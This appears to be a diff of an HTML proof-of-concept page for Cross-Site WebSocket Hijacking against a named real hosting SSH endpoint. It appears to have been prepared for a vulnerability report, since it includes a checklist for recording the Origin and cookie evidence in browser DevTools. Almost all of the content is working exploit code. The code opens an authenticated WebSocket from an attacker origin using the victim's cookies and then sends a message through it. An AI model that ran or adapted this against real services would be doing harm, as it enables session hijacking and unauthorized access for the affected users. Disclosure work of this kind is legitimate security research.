@@ -1,30 +1,36 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
   <html>
   <head>
       <title>CSWSH PoC - admin3-webhosting-ssh.infomaniak.com</title>
       <style>
-          body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
-          .log { background: #000; padding: 10px; height: 400px; overflow-y: auto; border: 1px solid #0f0; }
-          .success { color: #f00; font-weight: bold; }
+          body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; max-width: 900px; margin: 0 auto; }
+          .log { background: #000; padding: 15px; height: 500px; overflow-y: auto; border: 2px solid #0f0; border-radius: 4px; }
+          .success { color: #f00; font-weight: bold; font-size: 1.1em; }
           .sent { color: #ff0; }
           .recv { color: #0ff; }
-          button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; }
+          .info { color: #fff; }
+          button { background: #0f0; color: #000; border: none; padding: 12px 24px; cursor: pointer; font-size: 16px; font-weight: bold;
+  border-radius: 4px; margin: 5px; }
           button:hover { background: #0c0; }
+          .badge { background: #f00; color: #fff; padding: 2px 8px; border-radius: 3px; font-size: 0.8em; }
       </style>
   </head>
   <body>
-      <h1>🔴 CSWSH Exploit - admin3-webhosting-ssh.infomaniak.com</h1>
-      <p>Target: <code>wss://admin3-webhosting-ssh.infomaniak.com/</code></p>
-      <p>Origin: <code id="origin"></code></p>
-      <button onclick="connect()">🚀 Launch Exploit</button>
-      <button onclick="clearLog()" style="background:#333;color:#fff;margin-left:10px">Clear</button>
+      <h1>🔴 <span class="badge">CSWSH PoC</span> admin3-webhosting-ssh.infomaniak.com</h1>
+      <p><strong>Attacker Origin:</strong> <code id="origin"></code></p>
+      <p><strong>Target:</strong> <code>wss://admin3-webhosting-ssh.infomaniak.com/</code></p>
+
+      <button onclick="connect()">🚀 LAUNCH EXPLOIT</button>
+      <button onclick="clearLog()" style="background:#333;color:#fff">Clear Log</button>
+      <button onclick="showInstructions()" style="background:#0066cc;color:#fff">Show Recording Steps</button>
+
       <div class="log" id="log"></div>
 
       <script>
           const logEl = document.getElementById("log");
-          document.getElementById("origin").textContent = window.location.origin;
+          document.getElementById("origin").textContent = location.origin;
 
-          function log(msg, cls="") {
+          function log(msg, cls="info") {
               const line = document.createElement("div");
               line.className = cls;
               line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
@@ -34,33 +40,47 @@
 
           function clearLog() { logEl.innerHTML = ""; }
 
+          function showInstructions() {
+              log("=== RECORDING CHECKLIST ===", "success");
+              log("1. Open DevTools (F12) → Network tab → Filter 'WS'", "info");
+              log("2. Click 'LAUNCH EXPLOIT' below", "info");
+              log("3. Watch for '101 Switching Protocols' in Network", "info");
+              log("4. Click WS request → Headers tab → Show 'Origin' accepted", "info");
+              log("5. Click WS request → Cookies tab → Show victim cookies sent", "info");
+              log("6. Click WS request → Messages tab → Show frames", "info");
+              log("7. Console shows: 'CONNECTED - VULNERABLE!'", "success");
+          }
+
           function connect() {
-              log("[*] Initiating WebSocket connection...");
-              log("[*] Browser will send victim's cookies automatically");
+              clearLog();
+              log("TARGET: wss://admin3-webhosting-ssh.infomaniak.com/", "info");
+              log("ATTACKER ORIGIN: " + location.origin, "info");
+              log("Browser will auto-send victim cookies with handshake", "info");
+              log("Initiating WebSocket connection...", "info");
 
               const ws = new WebSocket("wss://admin3-webhosting-ssh.infomaniak.com/");
 
               ws.onopen = () => {
-                  log("[+] CONNECTION ESTABLISHED - CSWSH SUCCESSFUL!", "success");
-                  log("[+] Server accepted connection from: " + window.location.origin, "success");
-                  log("[>] Sending test message...", "sent");
-                  ws.send("CSWSH_POC_" + Date.now());
+                  log("CONNECTION ESTABLISHED - CSWSH SUCCESSFUL!", "success");
+                  log("Server accepted Origin: " + location.origin, "success");
+                  log("Victim's cookies sent automatically!", "success");
+                  log("Sending test message...", "sent");
+                  ws.send("CSWSH_POC_" + Date.now() + "_FROM_" + location.hostname);
               };
 
               ws.onmessage = (e) => {
-                  log("[<] Received: " + e.data, "recv");
+                  log("Received: " + e.data, "recv");
               };
 
               ws.onclose = (e) => {
-                  log("[!] Closed: Code=" + e.code + " Reason=" + (e.reason || "none"), "success");
+                  log("Connection closed: Code=" + e.code + " Reason=" + (e.reason || "none"), "success");
               };
 
               ws.onerror = (e) => {
-                  log("[!] Error (check DevTools Network tab)", "success");
+                  log("Error (check Network tab > WS filter for 101)", "success");
               };
 
-              // Auto-close after 15s
-              setTimeout(() => { ws.close(1000, "PoC done"); }, 15000);
+              setTimeout(() => { ws.close(1000, "PoC complete"); }, 15000);
           }
       </script>
   </body>
